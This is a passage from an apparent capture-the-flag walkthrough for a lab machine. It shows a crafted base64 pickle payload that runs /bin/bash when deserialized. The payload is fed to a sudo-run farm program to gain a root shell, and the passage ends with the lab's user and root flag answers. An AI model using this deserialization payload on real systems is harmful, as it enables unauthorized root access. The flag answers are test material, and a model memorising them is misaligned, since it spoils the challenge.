>>> holdit = pickle.dumps(x)
>>> base64.b64encode(holdit)
b'gANjcG9zaXgKc3lzdGVtCnEAWAkAAAAvYmluL2Jhc2hxAYVxAlJxAy4='
>>>
dill@ubuntu-xenial:/opt/peak_hill_farm$ sudo ./peak_hill_farm
Peak Hill Farm 1.0 - Grow something on the Peak Hill Farm!

to grow: gANjcG9zaXgKc3lzdGVtCnEAWAkAAAAvYmluL2Jhc2hxAYVxAlJxAy4=
root@ubuntu-xenial:/opt/peak_hill_farm#
```

```
root@ubuntu-xenial:/opt/peak_hill_farm# find /root/ -name "*root.txt*" -exec cat {} \;
e88f0a01135c05cf0912cf4bc335ee28
```

1. What is the user flag?

`f1e13335c47306e193212c98fc07b6a0`

2. What is the root flag?

`e88f0a01135c05cf0912cf4bc335ee28`
